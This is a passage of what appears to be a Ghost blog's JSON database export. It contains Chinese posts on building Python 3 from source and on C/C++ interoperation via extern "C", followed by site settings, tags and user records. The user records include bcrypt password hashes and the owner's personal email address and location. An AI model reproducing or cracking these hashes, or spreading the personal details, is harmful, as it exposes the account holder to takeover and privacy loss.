创建沙箱，做一个Python3环境\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>以前文章的搬家，留作记录。</p>\n<ul>\n<li>下载源码包<br>\n<code>wget https://www.python.org/ftp/python/3.3.7/Python-3.3.7.tgz</code></li>\n<li>解压<br>\n<code>tar xvzf Python-3.3.7.tgz</code></li>\n<li>编译安装<br>\n<code>./configure --prefix=/usr/local/python3</code><br>\n<code>make</code><br>\n<code>sudo make install</code></li>\n<li>默认调用 3.x 的方法<br>\n<code>mv /usr/bin/python /usr/bin/python_old</code><br>\n<code>ln -s /usr/local/python3/bin/python3 /usr/bin/python</code></li>\n<li>另外，也可以用 virtualenv 创建沙箱，做一个Python3环境</li>\n</ul>\n</div>","amp":null,"plaintext":"以前文章的搬家，留作记录。\n\n * 下载源码包\n   wget https://www.python.org/ftp/python/3.3.7/Python-3.3.7.tgz\n * 解压\n   tar xvzf Python-3.3.7.tgz\n * 编译安装\n   ./configure --prefix=/usr/local/python3\n   make\n   sudo make install\n * 默认调用 3.x 的方法\n   mv /usr/bin/python /usr/bin/python_old\n   ln -s /usr/local/python3/bin/python3 /usr/bin/python\n * 另外，也可以用 virtualenv 创建沙箱，做一个Python3环境","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-22T13:00:14.000Z","created_by":"1","updated_at":"2017-09-22T13:13:30.000Z","updated_by":"1","published_at":"2017-09-22T13:13:30.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59c5a278eca69d7b679a3877","uuid":"8d454837-d7c5-45ed-90b7-1b12f2a9ab97","title":"C 和 C++ 之间的相互调用","slug":"ccpluscall","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"旧文章搬家，转自Mike's Blog，留个备份。\\n\\n## extern \\\"C\\\"的理解\\n很多人认为 \\\"C\\\" 表示的 C 语言，实际并非如此，\\\"C\\\" 表示的是一种链接约定，只是因 C 和 C++ 语言之间的密切关系而在它们之间更多的应用而已。实际上 Fortran 和汇编语言也常常使用，因为它们也正好符合 C 实现的约定。\\n\\nextern \\\"C\\\"指令描述的是一种链接约定，它并不影响调用函数的定义，即使做了该声明，对函数类型的检查和参数转换仍要遵循 C++ 的标准，而不是 C。\\n\\n## extern \\\"C\\\"的作用\\n\\n不同的语言链接性是不同的，那么也决定了它们编译后的链接符号的不同，比如一个函数 void fun(double d)，C 语言会把它编译成类似 _fun 这样的符号，C 链接器只要找到该函数符号就可以链接成功，它假设参数类型信息是正确的。而 C++ 会把这个函数编译成类似 _fun_double 或 _xxx_funDxxx 这样的符号，在符号上增加了类型信息，这也是 C++ 可以实现重载的原因。\\n\\n那么，对于用 C 编译器编译成的库，用 C++ 直接链接势必会出现不能识别符号的问题，是的，需要extern \\\"C\\\" 的时刻来了，它就是干这个用的。extern \\\"C\\\" 的作用就是让编译器知道要以 C 语言的方式编译和链接封装函数。\\n\\n## 在 C++ 中调用 C 库的例子\\n* 做一个C动态库\\n<pre><code class=\\\"C\\\">// hello.c:\\nvoid hello()\\n{\\n  printf(\\\"hello\\\\n\\\");\\n}\\n</code></pre>\\n\\n* 编译并copy到系统库目录下 (也可以自己定义库目录，man ldconfig)\\n<pre><code class=\\\"json\\\">[root@coredump test]# gcc --shared -o libhello.so hello.c\\n[root@coredump test]# cp libhello.so /lib/\\n</code></pre>\\n* 写个C++程序去调用它\\n<pre><code class=\\\"C\\\">#ifdef __cplusplus\\nextern \\\"C\\\" {               // 告诉编译器下列代码要以C链接约定的模式进行链接\\n#endif\\n\\nvoid hello();\\n\\n#ifdef __cplusplus\\n}\\n#endif\\n\\nint main()\\n{\\n  hello();\\n  return 0;\\n}\\n</code></pre>\\n* 编译并运行\\n<pre><code class=\\\"json\\\">[root@coredump test]# g++ test.cpp -o test -lhello\\n[root@coredump test]# ./test\\nhello\\n[root@coredump test]#\\n</code></pre>\\n## C 调用 C++ 库\\n* 做一个C++库\\n<pre><code class=\\\"C\\\">void world()  \\n{  \\n  std::cout << \\\"world\\\" << std::endl;  \\n}\\n</code></pre>\\n* 编译并copy到系统库目录下\\n<pre><code class=\\\"json\\\">[root@coredump test]# g++ --shared -o libworld.so world.cpp\\n[root@coredump test]# cp libworld.so /lib/\\n</code></pre>\\n* 做一个中间接口库，对 C++ 库进行二次封装\\n<pre><code class=\\\"C\\\">void world();  \\n  \\n#ifdef __cplusplus  \\nextern \\\"C\\\" {  // 即使这是一个C++程序，下列这个函数的实现也要以C约定的风格来搞！  \\n#endif  \\n  \\n  void m_world()  \\n  {  \\n    world();  \\n  }  \\n  \\n#ifdef __cplusplus  \\n}  \\n#endif  \\n</code></pre>\\n* 其中方法m_world即为libworld库中world方法的二次封装，编译并copy到系统库目录下\\n<pre><code class=\\\"json\\\">[root@coredump test]# g++ --shared -o libmid.so mid.cpp -lworld\\n[root@coredump test]# cp libmid.so /lib/\\n</code></pre>\\n* C 程序通过链接二次接口库去调用 C++ 库\\n<pre><code class=\\\"C\\\">int main()  \\n{  \\n  m_world();  \\n  \\n  return 0;  \\n}  \\n</code></pre>\\n* 编译并运行\\n<pre><code class=\\\"json\\\">[root@coredump test]# gcc test.c -l mid -o test\\n[root@coredump test]# ./test\\nworld\\n[root@coredump test]# \\n</code></pre>\\n* 如果对于 C++ 库中含有类的，可以在二次接口函数中生成临时对象来调用对应的功能函数，当然要根据实际情况来定了。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>旧文章搬家，转自Mike's Blog，留个备份。</p>\n<h2 id=\"externc\">extern &quot;C&quot;的理解</h2>\n<p>很多人认为 &quot;C&quot; 表示的 C 语言，实际并非如此，&quot;C&quot; 表示的是一种链接约定，只是因 C 和 C++ 语言之间的密切关系而在它们之间更多的应用而已。实际上 Fortran 和汇编语言也常常使用，因为它们也正好符合 C 实现的约定。</p>\n<p>extern &quot;C&quot;指令描述的是一种链接约定，它并不影响调用函数的定义，即使做了该声明，对函数类型的检查和参数转换仍要遵循 C++ 的标准，而不是 C。</p>\n<h2 id=\"externc\">extern &quot;C&quot;的作用</h2>\n<p>不同的语言链接性是不同的，那么也决定了它们编译后的链接符号的不同，比如一个函数 void fun(double d)，C 语言会把它编译成类似 _fun 这样的符号，C 链接器只要找到该函数符号就可以链接成功，它假设参数类型信息是正确的。而 C++ 会把这个函数编译成类似 _fun_double 或 _xxx_funDxxx 这样的符号，在符号上增加了类型信息，这也是 C++ 可以实现重载的原因。</p>\n<p>那么，对于用 C 编译器编译成的库，用 C++ 直接链接势必会出现不能识别符号的问题，是的，需要extern &quot;C&quot; 的时刻来了，它就是干这个用的。extern &quot;C&quot; 的作用就是让编译器知道要以 C 语言的方式编译和链接封装函数。</p>\n<h2 id=\"cc\">在 C++ 中调用 C 库的例子</h2>\n<ul>\n<li>做一个C动态库</li>\n</ul>\n<pre><code class=\"C\">// hello.c:\nvoid hello()\n{\n  printf(\"hello\\n\");\n}\n</code></pre>\n<ul>\n<li>编译并copy到系统库目录下 (也可以自己定义库目录，man ldconfig)</li>\n</ul>\n<pre><code class=\"json\">[root@coredump test]# gcc --shared -o libhello.so hello.c\n[root@coredump test]# cp libhello.so /lib/\n</code></pre>\n<ul>\n<li>写个C++程序去调用它</li>\n</ul>\n<pre><code class=\"C\">#ifdef __cplusplus\nextern \"C\" {               // 告诉编译器下列代码要以C链接约定的模式进行链接\n#endif\n\nvoid hello();\n\n#ifdef __cplusplus\n}\n#endif\n\nint main()\n{\n  hello();\n  return 0;\n}\n</code></pre>\n<ul>\n<li>编译并运行</li>\n</ul>\n<pre><code class=\"json\">[root@coredump test]# g++ test.cpp -o test -lhello\n[root@coredump test]# ./test\nhello\n[root@coredump test]#\n</code></pre>\n<h2 id=\"cc\">C 调用 C++ 库</h2>\n<ul>\n<li>做一个C++库</li>\n</ul>\n<pre><code class=\"C\">void world()  \n{  \n  std::cout << \"world\" << std::endl;  \n}\n</code></pre>\n<ul>\n<li>编译并copy到系统库目录下</li>\n</ul>\n<pre><code class=\"json\">[root@coredump test]# g++ --shared -o libworld.so world.cpp\n[root@coredump test]# cp libworld.so /lib/\n</code></pre>\n<ul>\n<li>做一个中间接口库，对 C++ 库进行二次封装</li>\n</ul>\n<pre><code class=\"C\">void world();  \n  \n#ifdef __cplusplus  \nextern \"C\" {  // 即使这是一个C++程序，下列这个函数的实现也要以C约定的风格来搞！  \n#endif  \n  \n  void m_world()  \n  {  \n    world();  \n  }  \n  \n#ifdef __cplusplus  \n}  \n#endif  \n</code></pre>\n<ul>\n<li>其中方法m_world即为libworld库中world方法的二次封装，编译并copy到系统库目录下</li>\n</ul>\n<pre><code class=\"json\">[root@coredump test]# g++ --shared -o libmid.so mid.cpp -lworld\n[root@coredump test]# cp libmid.so /lib/\n</code></pre>\n<ul>\n<li>C 程序通过链接二次接口库去调用 C++ 库</li>\n</ul>\n<pre><code class=\"C\">int main()  \n{  \n  m_world();  \n  \n  return 0;  \n}  \n</code></pre>\n<ul>\n<li>编译并运行</li>\n</ul>\n<pre><code class=\"json\">[root@coredump test]# gcc test.c -l mid -o test\n[root@coredump test]# ./test\nworld\n[root@coredump test]# \n</code></pre>\n<ul>\n<li>如果对于 C++ 库中含有类的，可以在二次接口函数中生成临时对象来调用对应的功能函数，当然要根据实际情况来定了。</li>\n</ul>\n</div>","amp":null,"plaintext":"旧文章搬家，转自Mike's Blog，留个备份。\n\nextern \"C\"的理解\n很多人认为 \"C\" 表示的 C 语言，实际并非如此，\"C\" 表示的是一种链接约定，只是因 C 和 C++ 语言之间的密切关系而在它们之间更多的应用而已。实际上\nFortran 和汇编语言也常常使用，因为它们也正好符合 C 实现的约定。\n\nextern \"C\"指令描述的是一种链接约定，它并不影响调用函数的定义，即使做了该声明，对函数类型的检查和参数转换仍要遵循 C++ 的标准，而不是 C。\n\nextern \"C\"的作用\n不同的语言链接性是不同的，那么也决定了它们编译后的链接符号的不同，比如一个函数 void fun(double d)，C 语言会把它编译成类似 _fun\n这样的符号，C 链接器只要找到该函数符号就可以链接成功，它假设参数类型信息是正确的。而 C++ 会把这个函数编译成类似 _fun_double 或\n_xxx_funDxxx 这样的符号，在符号上增加了类型信息，这也是 C++ 可以实现重载的原因。\n\n那么，对于用 C 编译器编译成的库，用 C++ 直接链接势必会出现不能识别符号的问题，是的，需要extern \"C\" 的时刻来了，它就是干这个用的。extern\n\"C\" 的作用就是让编译器知道要以 C 语言的方式编译和链接封装函数。\n\n在 C++ 中调用 C 库的例子\n * 做一个C动态库\n\n// hello.c:\nvoid hello()\n{\n  printf(\"hello\\n\");\n}\n\n\n * 编译并copy到系统库目录下 (也可以自己定义库目录，man ldconfig)\n\n[root@coredump test]# gcc --shared -o libhello.so hello.c\n[root@coredump test]# cp libhello.so /lib/\n\n\n * 写个C++程序去调用它\n\n#ifdef __cplusplus\nextern \"C\" {               // 告诉编译器下列代码要以C链接约定的模式进行链接\n#endif\n\nvoid hello();\n\n#ifdef __cplusplus\n}\n#endif\n\nint main()\n{\n  hello();\n  return 0;\n}\n\n\n * 编译并运行\n\n[root@coredump test]# g++ test.cpp -o test -lhello\n[root@coredump test]# ./test\nhello\n[root@coredump test]#\n\n\nC 调用 C++ 库\n * 做一个C++库\n\nvoid world()  \n{  \n  std::cout << \"world\" << std::endl;  \n}\n\n\n * 编译并copy到系统库目录下\n\n[root@coredump test]# g++ --shared -o libworld.so world.cpp\n[root@coredump test]# cp libworld.so /lib/\n\n\n * 做一个中间接口库，对 C++ 库进行二次封装\n\nvoid world();  \n  \n#ifdef __cplusplus  \nextern \"C\" {  // 即使这是一个C++程序，下列这个函数的实现也要以C约定的风格来搞！  \n#endif  \n  \n  void m_world()  \n  {  \n    world();  \n  }  \n  \n#ifdef __cplusplus  \n}  \n#endif  \n\n\n * 其中方法m_world即为libworld库中world方法的二次封装，编译并copy到系统库目录下\n\n[root@coredump test]# g++ --shared -o libmid.so mid.cpp -lworld\n[root@coredump test]# cp libmid.so /lib/\n\n\n * C 程序通过链接二次接口库去调用 C++ 库\n\nint main()  \n{  \n  m_world();  \n  \n  return 0;  \n}  \n\n\n * 编译并运行\n\n[root@coredump test]# gcc test.c -l mid -o test\n[root@coredump test]# ./test\nworld\n[root@coredump test]# \n\n\n * 如果对于 C++ 库中含有类的，可以在二次接口函数中生成临时对象来调用对应的功能函数，当然要根据实际情况来定了。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-22T23:53:28.000Z","created_by":"1","updated_at":"2017-09-23T00:20:08.000Z","updated_by":"1","published_at":"2017-09-23T00:15:30.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null}],"posts_tags":[{"id":"59bcc7a5045d4920c1785786","post_id":"59bcc7a3045d4920c17856e2","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bcc7a5045d4920c1785787","post_id":"59bcc7a4045d4920c17856e3","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bcc7a5045d4920c1785788","post_id":"59bcc7a4045d4920c17856e4","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bcc7a5045d4920c1785789","post_id":"59bcc7a4045d4920c17856e5","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bcc7a5045d4920c178578a","post_id":"59bcc7a4045d4920c17856e6","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bcc7a5045d4920c178578b","post_id":"59bcc7a4045d4920c17856e7","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bcc7a5045d4920c178578c","post_id":"59bcc7a4045d4920c17856e8","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59bccd6cf9a5a920fc140c54","post_id":"59bccd6bf9a5a920fc140c39","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c55","post_id":"59bccd6bf9a5a920fc140c3a","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c56","post_id":"59bccd6bf9a5a920fc140c3b","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c57","post_id":"59bccd6bf9a5a920fc140c3c","tag_id":"59bccd6bf9a5a920fc140c2f","sort_order":0},{"id":"59bccd6cf9a5a920fc140c58","post_id":"59bccd6bf9a5a920fc140c3d","tag_id":"59bccd6bf9a5a920fc140c2f","sort_order":0},{"id":"59bccd6cf9a5a920fc140c59","post_id":"59bccd6bf9a5a920fc140c3e","tag_id":"59bccd6bf9a5a920fc140c2f","sort_order":0},{"id":"59bccd6cf9a5a920fc140c5a","post_id":"59bccd6bf9a5a920fc140c3f","tag_id":"59bccd6bf9a5a920fc140c2f","sort_order":0},{"id":"59bccd6cf9a5a920fc140c5b","post_id":"59bccd6bf9a5a920fc140c40","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c5c","post_id":"59bccd6bf9a5a920fc140c41","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c5d","post_id":"59bccd6bf9a5a920fc140c42","tag_id":"59bccd6bf9a5a920fc140c30","sort_order":0},{"id":"59bccd6cf9a5a920fc140c5e","post_id":"59bccd6bf9a5a920fc140c43","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c5f","post_id":"59bccd6bf9a5a920fc140c44","tag_id":"59bccd6bf9a5a920fc140c2e","sort_order":0},{"id":"59bccd6cf9a5a920fc140c60","post_id":"59bccd6bf9a5a920fc140c45","tag_id":"59bccd6bf9a5a920fc140c30","sort_order":0},{"id":"59bccd6cf9a5a920fc140c61","post_id":"59bccd6bf9a5a920fc140c46","tag_id":"59bccd6bf9a5a920fc140c33","sort_order":0},{"id":"59bccd6cf9a5a920fc140c62","post_id":"59bccd6bf9a5a920fc140c47","tag_id":"59bccd6bf9a5a920fc140c33","sort_order":0},{"id":"59bccd6cf9a5a920fc140c63","post_id":"59bccd6bf9a5a920fc140c48","tag_id":"59bccd6bf9a5a920fc140c33","sort_order":0},{"id":"59bccd6cf9a5a920fc140c64","post_id":"59bccd6bf9a5a920fc140c49","tag_id":"59bccd6bf9a5a920fc140c32","sort_order":0},{"id":"59bccd6cf9a5a920fc140c65","post_id":"59bccd6bf9a5a920fc140c4a","tag_id":"59bccd6bf9a5a920fc140c32","sort_order":0},{"id":"59bccd6cf9a5a920fc140c66","post_id":"59bccd6bf9a5a920fc140c4b","tag_id":"59bccd6bf9a5a920fc140c32","sort_order":0},{"id":"59bccd6cf9a5a920fc140c67","post_id":"59bccd6bf9a5a920fc140c4c","tag_id":"59bccd6bf9a5a920fc140c33","sort_order":0},{"id":"59bccd6cf9a5a920fc140c68","post_id":"59bccd6bf9a5a920fc140c4d","tag_id":"59bccd6bf9a5a920fc140c32","sort_order":0},{"id":"59bccd6cf9a5a920fc140c69","post_id":"59bccd6bf9a5a920fc140c4f","tag_id":"59bccd6bf9a5a920fc140c34","sort_order":0},{"id":"59bccd6cf9a5a920fc140c6a","post_id":"59bccd6bf9a5a920fc140c50","tag_id":"59bccd6bf9a5a920fc140c31","sort_order":0},{"id":"59bccd6cf9a5a920fc140c6b","post_id":"59bccd6bf9a5a920fc140c51","tag_id":"59bccd6bf9a5a920fc140c33","sort_order":0},{"id":"59bccd6cf9a5a920fc140c6c","post_id":"59bccd6bf9a5a920fc140c52","tag_id":"59bccd6bf9a5a920fc140c31","sort_order":0},{"id":"59bccd6cf9a5a920fc140c6d","post_id":"59bccd6bf9a5a920fc140c53","tag_id":"59bccd6bf9a5a920fc140c35","sort_order":0},{"id":"59bd24ef96d44132165a8606","post_id":"59bd1fc196d44132165a8605","tag_id":"59bccd6bf9a5a920fc140c2f","sort_order":0},{"id":"59c50c7aeca69d7b679a3876","post_id":"59c5095eeca69d7b679a3875","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0},{"id":"59c5a538eca69d7b679a3878","post_id":"59c5a278eca69d7b679a3877","tag_id":"59bcc7a4045d4920c17856e9","sort_order":0}],"roles":[{"id":"59bcc7a4045d4920c17856ee","name":"Administrator","description":"Administrators","created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856ef","name":"Editor","description":"Editors","created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f0","name":"Author","description":"Authors","created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"},{"id":"59bcc7a4045d4920c17856f1","name":"Owner","description":"Blog Owner","created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-16T06:41:40.000Z","updated_by":"1"}],"roles_users":[{"id":"59bcc7a5045d4920c1785723","role_id":"59bcc7a4045d4920c17856f0","user_id":"5951f5fca366002ebd5dbef7"},{"id":"59bcc7a5045d4920c178578d","role_id":"59bcc7a4045d4920c17856f1","user_id":"1"}],"settings":[{"id":"59bcc7adf9a5a920fc140c0d","key":"db_hash","value":"5d15640a-0a93-42a0-ab3d-edff8e6fd8a8","type":"core","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T06:41:49.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c0e","key":"next_update_check","value":"1506171115","type":"core","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-22T12:51:54.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c0f","key":"display_update_notification","value":"1.9.0","type":"core","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-22T12:51:54.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c10","key":"seen_notifications","value":"[]","type":"core","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T06:41:49.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c11","key":"title","value":"淙淙的小屋","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c12","key":"description","value":"| 安安静静地工作，快快乐乐地生活。|（文章有评论区，看不到的请科学上网）","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c13","key":"logo","value":"/content/images/2015/07/touxiang.jpg","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c14","key":"cover_image","value":"/content/images/2016/11/th-1.jpg","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c15","key":"icon","value":"","type":"blog","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c16","key":"default_locale","value":"en","type":"blog","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c17","key":"active_timezone","value":"Asia/Tokyo","type":"blog","created_at":"2016-11-27T08:21:22.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c18","key":"force_i18n","value":"true","type":"blog","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c19","key":"permalinks","value":"/:year/:month/:day/:slug/","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c1a","key":"amp","value":"true","type":"blog","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c1b","key":"ghost_head","value":"<script>\n    var disqus_shortname = 'nolanzong';\n</script>","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c1c","key":"ghost_foot","value":"<!-- You can safely delete this line if your theme does not require jQuery -->\n<script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-1.11.3.min.js\"></script>\n\n","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c1d","key":"facebook","value":"","type":"blog","created_at":"2016-11-27T08:21:22.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c1e","key":"twitter","value":"","type":"blog","created_at":"2016-11-27T08:21:22.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c1f","key":"labs","value":"{\"publicAPI\":true}","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c20","key":"navigation","value":"[{\"label\":\"首页\",\"url\":\"/\"},{\"label\":\"博主\",\"url\":\"/myself/\"}]","type":"blog","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c21","key":"slack","value":"[{\"url\":\"\"}]","type":"blog","created_at":"2016-11-27T08:21:22.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c22","key":"unsplash","value":"{}","type":"blog","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c23","key":"active_theme","value":"kaldorei","type":"theme","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T07:04:52.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c24","key":"active_apps","value":"[]","type":"app","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-16T06:41:49.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c25","key":"installed_apps","value":"[]","type":"app","created_at":"2017-09-16T06:41:49.000Z","created_by":"1","updated_at":"2017-09-22T12:56:50.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c26","key":"is_private","value":"false","type":"private","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"},{"id":"59bcc7adf9a5a920fc140c27","key":"password","value":"","type":"private","created_at":"2015-07-03T12:36:30.000Z","created_by":"1","updated_at":"2017-09-16T11:05:08.000Z","updated_by":"1"}],"subscribers":[],"tags":[{"id":"59bcc7a4045d4920c17856e9","name":"技术修行","slug":"daydayup","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-22T13:12:11.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c2e","name":"给学霸幼苗浇水","slug":"goddess","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2015-07-04T07:53:25.000Z","created_by":"1","updated_at":"2015-07-04T07:58:12.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c2f","name":"小屋起源","slug":"origin","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2015-07-06T04:45:03.000Z","created_by":"1","updated_at":"2015-07-06T04:45:13.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c30","name":"应聘经验","slug":"interview","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2015-07-09T13:50:21.000Z","created_by":"1","updated_at":"2015-07-09T13:50:45.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c31","name":"岛国见闻","slug":"japan","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2015-12-05T07:10:51.000Z","created_by":"1","updated_at":"2015-12-05T07:11:06.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c32","name":"坡县见闻","slug":"singapore","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2015-12-05T07:11:42.000Z","created_by":"1","updated_at":"2015-12-05T07:11:51.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c33","name":"黑客技术","slug":"hacker","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2015-12-05T11:41:11.000Z","created_by":"1","updated_at":"2015-12-05T11:41:18.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c34","name":"個人目標","slug":"target","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2016-12-09T05:37:39.000Z","created_by":"1","updated_at":"2016-12-09T05:38:04.000Z","updated_by":"1"},{"id":"59bccd6bf9a5a920fc140c35","name":"胡思乱想","slug":"thinking","description":null,"feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2017-05-21T01:59:09.000Z","created_by":"1","updated_at":"2017-05-21T01:59:21.000Z","updated_by":"1"}],"users":[{"id":"1","name":"淙淙","slug":"cong","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$nv.JedgNltS6wYCuURtQueYBsHuqXccgTQRro3.XrzbL6VtGJm1dO","email":"zongnan1989@gmail.com","profile_image":"/content/images/2017/09/touxiang.jpg","cover_image":null,"bio":"一只在岛国安闲度日的程序猿，一只想学中医，想学弹琴，想打电玩，想种地，想放羊，就是不想写代码的程序猿。","website":null,"location":"日本尼崎","facebook":null,"twitter":null,"accessibility":null,"status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":"[\"upload-a-theme\",\"getting-started\",\"using-the-editor\"]","last_seen":"2017-09-22T12:51:57.000Z","created_at":"2017-09-16T06:41:40.000Z","created_by":"1","updated_at":"2017-09-22T12:51:57.000Z","updated_by":"1"},{"id":"5951f5fca366002ebd5dbef7","name":"Ghost","slug":"ghost","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$avRkwpetYbwiRzko09gXMe3vDECNe8QPQlsf3RZjilqxXdEk.crVa","email":"ghost-author@example.com","profile_image":null,"cover_image":null,"bio":null,"website":null,"location":null,"facebook":null,"twitter":null,"accessibility":null,"status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":null,"last_seen":null,"created_at":"2017-09-16T06:41:41.000Z","created_by":"1","updated_at":"2017-09-16T06:41:41.000Z","updated_b